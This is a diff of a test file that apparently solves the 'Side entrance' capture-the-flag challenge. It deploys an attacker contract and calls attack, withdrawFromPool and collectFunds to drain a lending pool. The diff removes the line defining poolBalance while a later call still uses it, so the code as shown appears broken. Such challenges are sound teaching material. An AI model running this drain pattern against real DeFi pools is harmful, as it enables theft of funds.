@@ -48,14 +48,11 @@ describe('[Challenge] Side entrance', function () {
         const SideEntranceAttackPoolFactory = await ethers.getContractFactory('SideEntranceAttack', attacker);
         this.attackContract = await SideEntranceAttackPoolFactory.connect(attacker).deploy(this.pool.address);
 
-        const poolBalance = await ethers.getDefaultProvider().getBalance(this.pool.address);
         await this.attackContract.connect(attacker).attack(poolBalance);
 
         await this.attackContract.connect(attacker).withdrawFromPool();
 
         await this.attackContract.connect(attacker).collectFunds();
-
-
 
         // Lessons Learned ====================================================
 
